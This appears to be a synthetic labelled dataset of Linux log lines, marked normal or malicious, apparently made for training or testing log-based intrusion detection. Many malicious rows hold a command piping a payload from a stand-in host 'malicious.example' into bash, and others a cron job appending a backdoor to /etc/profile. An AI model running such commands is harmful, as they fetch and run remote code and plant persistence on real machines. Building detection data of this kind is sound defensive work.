id,log_text,label
1850,networkd: DHCPv4 address assigned to eth0,normal
1851,bash[2587]: curl http://malicious.example/payload.sh | bash,malicious
1852,CRON[6443]: (root) CMD (uptime),normal
1853,systemd[1]: Created malicious service persistence_2497.service,malicious
1854,sshd[7823]: Failed password for invalid user admin from 5.188.239.170 port 22 ssh2,malicious
1855,systemd[1]: Started Session 1999 of user root.,normal
1856,kernel: [ 3226.77 ] USB device plugged,normal
1857,systemd[1]: Started Session 1233 of user root.,normal
1858,CRON[2079]: (root) CMD (ls),normal
1859,CRON[1206]: (root) CMD (uptime),normal
1860,CRON[5489]: (root) CMD (pwd),normal
1861,kernel: [ 8306.73 ] Module loaded: suspicious_mod,malicious
1862,bash[3178]: curl http://malicious.example/payload.sh | bash,malicious
1863,sshd[2977]: Accepted publickey for user from 192.168.116.195 port 22 ssh2,normal
1864,systemd[1]: Started Session 1693 of user root.,normal
1865,kernel: [ 8223.75 ] Module loaded: suspicious_mod,malicious
1866,kernel: [ 8978.59 ] Module loaded: suspicious_mod,malicious
1867,systemd[1]: Created malicious service persistence_9685.service,malicious
1868,kernel: [ 2578.73 ] Module loaded: suspicious_mod,malicious
1869,kernel: [ 7940.15 ] Module loaded: suspicious_mod,malicious
1870,sshd[3189]: Accepted publickey for user from 192.168.133.61 port 22 ssh2,normal
1871,CRON[6911]: (root) CMD (uptime),normal
1872,networkd: DHCPv4 address assigned to eth0,normal
1873,sshd[2347]: Accepted publickey for user from 192.168.15.147 port 22 ssh2,normal
1874,systemd[1]: Created malicious service persistence_8586.service,malicious
1875,CRON[7151]: (root) CMD (uptime),normal
1876,CRON[2683]: (root) CMD (uptime),normal
1877,sshd[7334]: Failed password for invalid user admin from 5.188.143.76 port 22 ssh2,malicious
1878,sshd[2641]: Failed password for invalid user admin from 5.188.18.217 port 22 ssh2,malicious
1879,systemd[1]: Created malicious service persistence_8182.service,malicious
1880,CRON[4860]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
1881,kernel: [ 8622.56 ] USB device plugged,normal
1882,sshd[6999]: Failed password for invalid user admin from 5.188.23.182 port 22 ssh2,malicious
1883,sshd[8734]: Failed password for invalid user admin from 5.188.22.195 port 22 ssh2,malicious
1884,CRON[3341]: (root) CMD (whoami),normal
1885,CRON[8787]: (root) CMD (pwd),normal
1886,bash[2459]: curl http://malicious.example/payload.sh | bash,malicious
1887,systemd[1]: Started Session 1813 of user root.,normal
1888,systemd[1]: Started Session 5165 of user root.,normal
1889,systemd[1]: Started Session 2013 of user root.,normal
1890,networkd: DHCPv4 address assigned to eth0,normal
1891,CRON[6728]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
1892,CRON[7843]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
1893,sshd[6750]: Accepted publickey for user from 192.168.33.207 port 22 ssh2,normal
1894,networkd: DHCPv4 address assigned to eth0,normal
1895,sshd[4358]: Accepted publickey for user from 192.168.214.11 port 22 ssh2,normal
1896,CRON[5463]: (root) CMD (ls),normal
1897,bash[9840]: curl http://malicious.example/payload.sh | bash,malicious
1898,kernel: [ 9007.01 ] Module loaded: suspicious_mod,malicious
1899,systemd[1]: Created malicious service persistence_9129.service,malicious
1900,CRON[8592]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
1901,kernel: [ 7628.06 ] Module loaded: suspicious_mod,malicious
1902,kernel: [ 8502.22 ] USB device plugged,normal
1903,CRON[5260]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
1904,networkd: DHCPv4 address assigned to eth0,normal
1905,CRON[8491]: (root) CMD (uptime),normal
1906,networkd: DHCPv4 address assigned to eth0,normal
1907,systemd[1]: Started Session 9744 of user root.,normal
1908,kernel: [ 228.56 ] USB device plugged,normal
1909,bash[2552]: curl http://malicious.example/payload.sh | bash,malicious
1910,systemd[1]: Started Session 9580 of user root.,normal
1911,systemd[1]: Created malicious service persistence_3964.service,malicious
1912,networkd: DHCPv4 address assigned to eth0,normal
1913,bash[1097]: curl http://malicious.example/payload.sh | bash,malicious
1914,CRON[4724]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
1915,systemd[1]: Started Session 5220 of user root.,normal
1916,systemd[1]: Created malicious service persistence_4950.service,malicious
1917,systemd[1]: Created malicious service persistence_3106.service,malicious
1918,systemd[1]: Started Session 4850 of user root.,normal
1919,sshd[4605]: Accepted publickey for user from 192.168.253.187 port 22 ssh2,normal
1920,systemd[1]: Created malicious service persistence_5088.service,malicious
1921,networkd: DHCPv4 address assigned to eth0,normal
1922,networkd: DHCPv4 address assigned to eth0,normal
1923,sshd[4637]: Accepted publickey for user from 192.168.139.50 port 22 ssh2,normal
1924,kernel: [ 4808.56 ] USB device plugged,normal
1925,kernel: [ 1911.72 ] USB device plugged,normal
1926,sshd[3885]: Failed password for invalid user admin from 5.188.186.30 port 22 ssh2,malicious
1927,CRON[6065]: (root) CMD (whoami),normal
1928,sshd[7303]: Accepted publickey for user from 192.168.158.158 port 22 ssh2,normal
1929,CRON[7420]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
1930,CRON[1412]: (root) CMD (uptime),normal
1931,kernel: [ 5460.27 ] USB device plugged,normal
1932,systemd[1]: Created malicious service persistence_5697.service,malicious
1933,systemd[1]: Created malicious service persistence_7054.service,malicious
1934,systemd[1]: Started Session 9526 of user root.,normal
1935,kernel: [ 1248.24 ] Module loaded: suspicious_mod,malicious
1936,bash[5917]: curl http://malicious.example/payload.sh | bash,malicious
1937,systemd[1]: Created malicious service persistence_9373.service,malicious
1938,sshd[8648]: Failed password for invalid user admin from 5.188.188.141 port 22 ssh2,malicious
1939,bash[2245]: curl http://malicious.example/payload.sh | bash,malicious
1940,sshd[8863]: Accepted publickey for user from 192.168.70.222 port 22 ssh2,normal
1941,sshd[2590]: Failed password for invalid user admin from 5.188.173.222 port 22 ssh2,malicious
1942,CRON[3575]: (root) CMD (ls),normal
1943,networkd: DHCPv4 address assigned to eth0,normal
1944,CRON[2183]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
1945,systemd[1]: Created malicious service persistence_9959.service,malicious
1946,sshd[9088]: Failed password for invalid user admin from 5.188.85.150 port 22 ssh2,malicious
1947,sshd[2504]: Failed password for invalid user admin from 5.188.2.53 port 22 ssh2,malicious
1948,kernel: [ 9866.05 ] USB device plugged,normal
1949,kernel: [ 5188.02 ] Module loaded: suspicious_mod,malicious
1950,sshd[1693]: Accepted publickey for user from 192.168.88.5 port 22 ssh2,normal
1951,systemd[1]: Started Session 3858 of user root.,normal
1952,kernel: [ 5717.75 ] Module loaded: suspicious_mod,malicious
1953,kernel: [ 1756.34 ] Module loaded: suspicious_mod,malicious
1954,sshd[5327]: Accepted publickey for user from 192.168.79.55 port 22 ssh2,normal
1955,sshd[7405]: Accepted publickey for user from 192.168.171.237 port 22 ssh2,normal
1956,networkd: DHCPv4 address assigned to eth0,normal
1957,kernel: [ 5395.89 ] Module loaded: suspicious_mod,malicious
1958,systemd[1]: Created malicious service persistence_5686.service,malicious
1959,CRON[4269]: (root) CMD (ls),normal
1960,CRON[6277]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
1961,sshd[6133]: Failed password for invalid user admin from 5.188.46.223 port 22 ssh2,malicious
1962,sshd[6535]: Accepted publickey for user from 192.168.236.88 port 22 ssh2,normal
1963,kernel: [ 3647.31 ] USB device plugged,normal
1964,bash[6002]: curl http://malicious.example/payload.sh | bash,malicious
1965,kernel: [ 505.41 ] USB device plugged,normal
1966,kernel: [ 8505.08 ] Module loaded: suspicious_mod,malicious
1967,bash[6100]: curl http://malicious.example/payload.sh | bash,malicious
1968,kernel: [ 884.43 ] Module loaded: suspicious_mod,malicious
1969,kernel: [ 7985.43 ] USB device plugged,normal
1970,systemd[1]: Started Session 5236 of user root.,normal
1971,CRON[2321]: (root) CMD (whoami),normal
1972,CRON[7935]: (root) CMD (uptime),normal
1973,networkd: DHCPv4 address assigned to eth0,normal
1974,networkd: DHCPv4 address assigned to eth0,normal
1975,kernel: [ 2899.91 ] Module loaded: suspicious_mod,malicious
1976,bash[6788]: curl http://malicious.example/payload.sh | bash,malicious
1977,sshd[5584]: Accepted publickey for user from 192.168.169.192 port 22 ssh2,normal
1978,kernel: [ 4830.25 ] USB device plugged,normal
1979,systemd[1]: Created malicious service persistence_3379.service,malicious
1980,networkd: DHCPv4 address assigned to eth0,normal
1981,kernel: [ 9538.06 ] USB device plugged,normal
1982,CRON[1994]: (root) CMD (pwd),normal
1983,sshd[3375]: Accepted publickey for user from 192.168.179.7 port 22 ssh2,normal
1984,sshd[4299]: Failed password for invalid user admin from 5.188.104.142 port 22 ssh2,malicious
1985,kernel: [ 1366.91 ] Module loaded: suspicious_mod,malicious
1986,CRON[9519]: (root) CMD (whoami),normal
1987,systemd[1]: Started Session 6683 of user root.,normal
1988,systemd[1]: Started Session 1526 of user root.,normal
1989,kernel: [ 279.78 ] Module loaded: suspicious_mod,malicious
1990,kernel: [ 2902.85 ] Module loaded: suspicious_mod,malicious
1991,CRON[3983]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
1992,sshd[4281]: Accepted publickey for user from 192.168.102.150 port 22 ssh2,normal
1993,kernel: [ 184.44 ] Module loaded: suspicious_mod,malicious
1994,systemd[1]: Created malicious service persistence_1299.service,malicious
1995,sshd[7468]: Failed password for invalid user admin from 5.188.17.153 port 22 ssh2,malicious
1996,bash[9360]: curl http://malicious.example/payload.sh | bash,malicious
1997,systemd[1]: Started Session 6106 of user root.,normal
1998,sshd[4143]: Failed password for invalid user admin from 5.188.222.147 port 22 ssh2,malicious
1999,networkd: DHCPv4 address assigned to eth0,normal
2000,CRON[6793]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
2001,sshd[6141]: Accepted publickey for user from 192.168.164.39 port 22 ssh2,normal
2002,networkd: DHCPv4 address assigned to eth0,normal
2003,kernel: [ 8013.89 ] USB device plugged,normal
2004,kernel: [ 6482.16 ] USB device plugged,normal
2005,CRON[5096]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
2006,bash[9080]: curl http://malicious.example/payload.sh | bash,malicious
2007,kernel: [ 1027.01 ] USB device plugged,normal
2008,CRON[5904]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
2009,CRON[4347]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
2010,kernel: [ 4498.32 ] Module loaded: suspicious_mod,malicious
2011,systemd[1]: Started Session 8658 of user root.,normal
2012,kernel: [ 3085.97 ] USB device plugged,normal
2013,kernel: [ 6273.47 ] Module loaded: suspicious_mod,malicious
2014,CRON[4773]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
2015,CRON[8308]: (root) CMD (ls),normal
2016,CRON[2109]: (root) CMD (whoami),normal
2017,kernel: [ 1355.14 ] USB device plugged,normal
2018,sshd[4116]: Failed password for invalid user admin from 5.188.5.240 port 22 ssh2,malicious
2019,sshd[7680]: Accepted publickey for user from 192.168.136.107 port 22 ssh2,normal
2020,sshd[6705]: Failed password for invalid user admin from 5.188.22.194 port 22 ssh2,malicious
2021,sshd[2284]: Accepted publickey for user from 192.168.95.175 port 22 ssh2,normal
2022,networkd: DHCPv4 address assigned to eth0,normal
2023,networkd: DHCPv4 address assigned to eth0,normal
2024,CRON[7452]: (root) CMD (ls),normal
2025,kernel: [ 8076.36 ] Module loaded: suspicious_mod,malicious
2026,CRON[4702]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
2027,CRON[7688]: (root) CMD (uptime),normal
2028,systemd[1]: Started Session 8798 of user root.,normal
2029,kernel: [ 8952.63 ] Module loaded: suspicious_mod,malicious
2030,sshd[1389]: Failed password for invalid user admin from 5.188.130.178 port 22 ssh2,malicious
2031,sshd[6709]: Accepted publickey for user from 192.168.6.77 port 22 ssh2,normal
2032,systemd[1]: Created malicious service persistence_1036.service,malicious
2033,sshd[6048]: Accepted publickey for user from 192.168.133.162 port 22 ssh2,normal
2034,kernel: [ 1079.13 ] USB device plugged,normal
2035,sshd[9866]: Accepted publickey for user from 192.168.141.128 port 22 ssh2,normal
2036,CRON[4897]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
2037,sshd[3826]: Accepted publickey for user from 192.168.154.157 port 22 ssh2,normal
2038,systemd[1]: Created malicious service persistence_9949.service,malicious
2039,sshd[9329]: Failed password for invalid user admin from 5.188.93.240 port 22 ssh2,malicious
2040,kernel: [ 4658.16 ] Module loaded: suspicious_mod,malicious
2041,kernel: [ 7863.93 ] Module loaded: suspicious_mod,malicious
2042,CRON[6615]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
2043,kernel: [ 5430.21 ] USB device plugged,normal
2044,bash[1003]: curl http://malicious.example/payload.sh | bash,malicious
2045,CRON[1751]: (root) CMD (whoami),normal
2046,kernel: [ 5205.43 ] USB device plugged,normal
2047,sshd[4076]: Failed password for invalid user admin from 5.188.26.50 port 22 ssh2,malicious
2048,bash[3485]: curl http://malicious.example/payload.sh | bash,malicious
2049,CRON[3858]: (root) CMD (pwd),normal
2050,systemd[1]: Started Session 5722 of user root.,normal
2051,sshd[9436]: Accepted publickey for user from 192.168.12.119 port 22 ssh2,normal
2052,CRON[4924]: (root) CMD (pwd),normal
2053,kernel: [ 8585.58 ] Module loaded: suspicious_mod,malicious
2054,sshd[2820]: Accepted publickey for user from 192.168.200.135 port 22 ssh2,normal
2055,bash[3427]: curl http://malicious.example/payload.sh | bash,malicious
2056,systemd[1]: Started Session 7586 of user root.,normal
2057,CRON[5401]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
2058,sshd[4237]: Failed password for invalid user admin from 5.188.6.135 port 22 ssh2,malicious
2059,sshd[4853]: Failed password for invalid user admin from 5.188.19.239 port 22 ssh2,malicious
2060,systemd[1]: Created malicious service persistence_7553.service,malicious
2061,bash[3006]: curl http://malicious.example/payload.sh | bash,malicious
2062,sshd[7935]: Accepted publickey for user from 192.168.135.189 port 22 ssh2,normal
2063,systemd[1]: Created malicious service persistence_7712.service,malicious
2064,systemd[1]: Created malicious service persistence_9352.service,malicious
2065,systemd[1]: Started Session 3484 of user root.,normal
2066,systemd[1]: Started Session 4189 of user root.,normal
2067,bash[3609]: curl http://malicious.example/payload.sh | bash,malicious
2068,systemd[1]: Created malicious service persistence_5190.service,malicious
2069,networkd: DHCPv4 address assigned to eth0,normal
2070,CRON[3275]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
2071,CRON[5559]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
2072,CRON[6325]: (root) CMD (whoami),normal
2073,bash[2282]: curl http://malicious.example/payload.sh | bash,malicious
2074,systemd[1]: Created malicious service persistence_6105.service,malicious
2075,systemd[1]: Created malicious service persistence_3998.service,malicious
2076,kernel: [ 2700.46 ] Module loaded: suspicious_mod,malicious
2077,kernel: [ 4545.46 ] Module loaded: suspicious_mod,malicious
2078,systemd[1]: Started Session 2925 of user root.,normal
2079,CRON[8834]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
2080,networkd: DHCPv4 address assigned to eth0,normal
2081,systemd[1]: Started Session 8922 of user root.,normal
2082,sshd[6247]: Accepted publickey for user from 192.168.179.242 port 22 ssh2,normal
2083,kernel: [ 7549.54 ] USB device plugged,normal
2084,sshd[2443]: Failed password for invalid user admin from 5.188.28.164 port 22 ssh2,malicious
2085,sshd[2088]: Failed password for invalid user admin from 5.188.157.128 port 22 ssh2,malicious
2086,sshd[7646]: Failed password for invalid user admin from 5.188.205.41 port 22 ssh2,malicious
2087,networkd: DHCPv4 address assigned to eth0,normal
2088,kernel: [ 9375.37 ] USB device plugged,normal
2089,systemd[1]: Created malicious service persistence_5059.service,malicious
2090,sshd[9071]: Accepted publickey for user from 192.168.132.217 port 22 ssh2,normal
2091,systemd[1]: Started Session 7962 of user root.,normal
2092,kernel: [ 7415.97 ] USB device plugged,normal
2093,kernel: [ 3485.1 ] Module loaded: suspicious_mod,malicious
2094,CRON[1215]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
2095,kernel: [ 3365.14 ] Module loaded: suspicious_mod,malicious
2096,networkd: DHCPv4 address assigned to eth0,normal
2097,CRON[1302]: (root) CMD (ls),normal
2098,sshd[1845]: Failed password for invalid user admin from 5.188.61.230 port 22 ssh2,malicious
2099,systemd[1]: Started Session 5347 of user root.,normal
2100,networkd: DHCPv4 address assigned to eth0,normal
2101,systemd[1]: Created malicious service persistence_7089.service,malicious
2102,sshd[6955]: Failed password for invalid user admin from 5.188.81.22 port 22 ssh2,malicious
2103,systemd[1]: Created malicious service persistence_9969.service,malicious
2104,CRON[9308]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
2105,systemd[1]: Started Session 4093 of user root.,normal
2106,CRON[6452]: (root) CMD (ls),normal
2107,sshd[1854]: Accepted publickey for user from 192.168.138.59 port 22 ssh2,normal
2108,systemd[1]: Created malicious service persistence_6332.service,malicious
2109,sshd[4575]: Accepted publickey for user from 192.168.161.86 port 22 ssh2,normal
2110,kernel: [ 3841.41 ] Module loaded: suspicious_mod,malicious
2111,systemd[1]: Started Session 2510 of user root.,normal
2112,kernel: [ 1282.12 ] USB device plugged,normal
2113,sshd[7476]: Failed password for invalid user admin from 5.188.46.200 port 22 ssh2,malicious
2114,networkd: DHCPv4 address assigned to eth0,normal
2115,bash[6270]: curl http://malicious.example/payload.sh | bash,malicious
2116,sshd[5617]: Accepted publickey for user from 192.168.20.204 port 22 ssh2,normal
2117,networkd: DHCPv4 address assigned to eth0,normal
2118,networkd: DHCPv4 address assigned to eth0,normal
2119,networkd: DHCPv4 address assigned to eth0,normal
2120,bash[3515]: curl http://malicious.example/payload.sh | bash,malicious
2121,CRON[6000]: (root) CMD (uptime),normal
2122,kernel: [ 4876.76 ] USB device plugged,normal
2123,CRON[6498]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
2124,bash[7687]: curl http://malicious.example/payload.sh | bash,malicious
2125,CRON[4875]: (root) CMD (whoami),normal
2126,sshd[7033]: Accepted publickey for user from 192.168.139.43 port 22 ssh2,normal
2127,kernel: [ 2397.78 ] Module loaded: suspicious_mod,malicious
2128,kernel: [ 2379.96 ] USB device plugged,normal
2129,CRON[8805]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
2130,systemd[1]: Started Session 9160 of user root.,normal
2131,systemd[1]: Created malicious service persistence_6148.service,malicious
2132,CRON[8696]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
2133,kernel: [ 1313.42 ] Module loaded: suspicious_mod,malicious
2134,bash[9757]: curl http://malicious.example/payload.sh | bash,malicious
2135,kernel: [ 8826.51 ] USB device plugged,normal
2136,sshd[6942]: Accepted publickey for user from 192.168.129.42 port 22 ssh2,normal
2137,sshd[4909]: Accepted publickey for user from 192.168.133.82 port 22 ssh2,normal
2138,kernel: [ 2398.75 ] USB device plugged,normal
2139,sshd[9546]: Accepted publickey for user from 192.168.241.92 port 22 ssh2,normal
2140,systemd[1]: Created malicious service persistence_5292.service,malicious
2141,bash[6751]: curl http://malicious.example/payload.sh | bash,malicious
2142,bash[6958]: curl http://malicious.example/payload.sh | bash,malicious
2143,networkd: DHCPv4 address assigned to eth0,normal
2144,systemd[1]: Started Session 3358 of user root.,normal
2145,bash[5993]: curl http://malicious.example/payload.sh | bash,malicious
2146,bash[6241]: curl http://malicious.example/payload.sh | bash,malicious
2147,sshd[6242]: Accepted publickey for user from 192.168.87.4 port 22 ssh2,normal
2148,bash[2366]: curl http://malicious.example/payload.sh | bash,malicious
2149,sshd[2175]: Failed password for invalid user admin from 5.188.202.173 port 22 ssh2,malicious
2150,CRON[2970]: (root) CMD (pwd),normal
2151,bash[8074]: curl http://malicious.example/payload.sh | bash,malicious
2152,systemd[1]: Started Session 4366 of user root.,normal
2153,systemd[1]: Created malicious service persistence_6518.service,malicious
2154,systemd[1]: Started Session 7101 of user root.,normal
2155,networkd: DHCPv4 address assigned to eth0,normal
2156,systemd[1]: Created malicious service persistence_1207.service,malicious
2157,CRON[3839]: (root) CMD (uptime),normal
2158,networkd: DHCPv4 address assigned to eth0,normal
2159,CRON[8850]: (root) CMD (whoami),normal
2160,systemd[1]: Created malicious service persistence_3301.service,malicious
2161,kernel: [ 4218.64 ] Module loaded: suspicious_mod,malicious
2162,bash[6223]: curl http://malicious.example/payload.sh | bash,malicious
2163,bash[5472]: curl http://malicious.example/payload.sh | bash,malicious
2164,sshd[4809]: Accepted publickey for user from 192.168.63.206 port 22 ssh2,normal
2165,systemd[1]: Created malicious service persistence_8837.service,malicious
2166,CRON[8685]: (root) CMD (whoami),normal
2167,bash[5253]: curl http://malicious.example/payload.sh | bash,malicious
2168,kernel: [ 4600.43 ] Module loaded: suspicious_mod,malicious
2169,bash[6374]: curl http://malicious.example/payload.sh | bash,malicious
2170,kernel: [ 624.45 ] USB device plugged,normal
2171,sshd[5829]: Accepted publickey for user from 192.168.193.16 port 22 ssh2,normal
2172,systemd[1]: Created malicious service persistence_8726.service,malicious
2173,systemd[1]: Created malicious service persistence_1636.service,malicious
2174,kernel: [ 273.03 ] USB device plugged,normal
2175,systemd[1]: Started Session 9449 of user root.,normal
2176,CRON[2385]: (root) CMD (uptime),normal
2177,CRON[3922]: (root) CMD (ls),normal
2178,sshd[1477]: Accepted publickey for user from 192.168.117.139 port 22 ssh2,normal
2179,bash[7088]: curl http://malicious.example/payload.sh | bash,malicious
2180,networkd: DHCPv4 address assigned to eth0,normal
2181,kernel: [ 8720.24 ] USB device plugged,normal
2182,sshd[4762]: Accepted publickey for user from 192.168.150.129 port 22 ssh2,normal
2183,networkd: DHCPv4 address assigned to eth0,normal
2184,bash[6626]: curl http://malicious.example/payload.sh | bash,malicious
2185,systemd[1]: Created malicious service persistence_9918.service,malicious
2186,CRON[8980]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
2187,systemd[1]: Created malicious service persistence_6593.service,malicious
2188,sshd[8051]: Accepted publickey for user from 192.168.54.197 port 22 ssh2,normal
2189,systemd[1]: Created malicious service persistence_8040.service,malicious
2190,kernel: [ 2173.25 ] Module loaded: suspicious_mod,malicious
2191,CRON[2939]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
2192,sshd[8562]: Failed password for invalid user admin from 5.188.116.51 port 22 ssh2,malicious
2193,kernel: [ 2043.98 ] USB device plugged,normal
2194,systemd[1]: Created malicious service persistence_7848.service,malicious
2195,sshd[4393]: Failed password for invalid user admin from 5.188.69.29 port 22 ssh2,malicious
2196,systemd[1]: Started Session 7455 of user root.,normal
2197,bash[3988]: curl http://malicious.example/payload.sh | bash,malicious
2198,bash[2054]: curl http://malicious.example/payload.sh | bash,malicious
2199,systemd[1]: Created malicious service persistence_7965.service,malicious
2200,systemd[1]: Started Session 9714 of user root.,normal
2201,bash[8628]: curl http://malicious.example/payload.sh | bash,malicious
2202,CRON[8614]: (root) CMD (whoami),normal
2203,sshd[8108]: Accepted publickey for user from 192.168.114.52 port 22 ssh2,normal
2204,kernel: [ 5399.57 ] USB device plugged,normal
2205,systemd[1]: Created malicious service persistence_6450.service,malicious
2206,sshd[2913]: Accepted publickey for user from 192.168.37.92 port 22 ssh2,normal
2207,kernel: [ 4092.65 ] USB device plugged,normal
2208,sshd[6197]: Failed password for invalid user admin from 5.188.102.159 port 22 ssh2,malicious
2209,sshd[8624]: Failed password for invalid user admin from 5.188.187.7 port 22 ssh2,malicious
2210,sshd[2399]: Accepted publickey for user from 192.168.127.242 port 22 ssh2,normal
2211,CRON[8543]: (root) CMD (pwd),normal
2212,CRON[3141]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
2213,networkd: DHCPv4 address assigned to eth0,normal
2214,CRON[9731]: (root) CMD (ls),normal
2215,kernel: [ 5575.6 ] Module loaded: suspicious_mod,malicious
2216,CRON[2931]: (root) CMD (ls),normal
2217,sshd[4999]: Accepted publickey for user from 192.168.180.92 port 22 ssh2,normal
2218,systemd[1]: Created malicious service persistence_2281.service,malicious
2219,bash[4068]: curl http://malicious.example/payload.sh | bash,malicious
2220,kernel: [ 4826.73 ] USB device plugged,normal
2221,kernel: [ 1307.02 ] USB device plugged,normal
2222,CRON[4638]: (root) CMD (whoami),normal
2223,networkd: DHCPv4 address assigned to eth0,normal
2224,sshd[9288]: Accepted publickey for user from 192.168.15.183 port 22 ssh2,normal
2225,systemd[1]: Created malicious service persistence_8149.service,malicious
2226,CRON[2598]: (root) CMD (uptime),normal
2227,kernel: [ 2942.91 ] USB device plugged,normal
2228,sshd[9858]: Accepted publickey for user from 192.168.201.216 port 22 ssh2,normal
2229,kernel: [ 3756.09 ] USB device plugged,normal
2230,kernel: [ 4456.44 ] USB device plugged,normal
2231,sshd[8313]: Accepted publickey for user from 192.168.120.10 port 22 ssh2,normal
2232,kernel: [ 6150.01 ] USB device plugged,normal
2233,systemd[1]: Created malicious service persistence_5126.service,malicious
2234,networkd: DHCPv4 address assigned to eth0,normal
2235,bash[5907]: curl http://malicious.example/payload.sh | bash,malicious
2236,systemd[1]: Started Session 4596 of user root.,normal
2237,networkd: DHCPv4 address assigned to eth0,normal
2238,sshd[9042]: Failed password for invalid user admin from 5.188.47.54 port 22 ssh2,malicious
2239,kernel: [ 3013.17 ] Module loaded: suspicious_mod,malicious
2240,CRON[5195]: (root) CMD (whoami),normal
2241,systemd[1]: Created malicious service persistence_4486.service,malicious
2242,systemd[1]: Started Session 4133 of user root.,normal
2243,kernel: [ 5606.0 ] Module loaded: suspicious_mod,malicious
2244,kernel: [ 4537.57 ] Module loaded: suspicious_mod,malicious
2245,sshd[4919]: Failed password for invalid user admin from 5.188.105.26 port 22 ssh2,malicious
2246,kernel: [ 1863.6 ] USB device plugged,normal
2247,kernel: [ 2535.54 ] Module loaded: suspicious_mod,malicious
2248,sshd[7708]: Failed password for invalid user admin from 5.188.71.60 port 22 ssh2,malicious
2249,bash[5838]: curl http://malicious.example/payload.sh | bash,malicious
2250,sshd[4201]: Accepted publickey for user from 192.168.103.123 port 22 ssh2,normal
2251,networkd: DHCPv4 address assigned to eth0,normal
2252,networkd: DHCPv4 address assigned to eth0,normal
2253,bash[8636]: curl http://malicious.example/payload.sh | bash,malicious
2254,CRON[1487]: (root) CMD (/bin/bash -c 'echo backdoor >> /etc/profile'),malicious
2255,sshd[8281]: Accepted publickey for user from 192.168.146.78 port 22 ssh2,normal
2256,sshd[3231]: Failed password for invalid user admin from 5.188.123.0 port 22 ssh2,malicious
2257,sshd[1929]: Failed password for invalid user admin from 5.188.243.5 port 22 ssh2,malicious
2258,sshd[8387]: Accepted publickey for user from 192.168.123.83 port 22 ssh2,normal
2259,sshd[3551]: Failed password for invalid user admin from 5.188.98.2 port 22 ssh2,malicious
2260,CRON[5429]: (root) CMD (uptime),normal
2261,networkd: DHCPv4 address assigned to eth0,normal
2262,kernel: [ 655.62 ] USB device plugged,normal
2263,networkd: DHCPv4 address assigned to eth0,normal
2264,networkd: DHCPv4 address assigned to eth0,normal
2265,kernel: [ 1331.08 ] USB device plugged,normal
2266,kernel: [ 795.04 ] Module loaded: suspicious_mod,malicious
2267,sshd[2379]: Accepted publickey for user from 192.168.251.15 port 22 ssh2,normal
2268,networkd: DHCPv4 address assigned to eth0,normal
2269,kernel: [ 3617.28 ] Module loaded: suspicious_mod,malicious
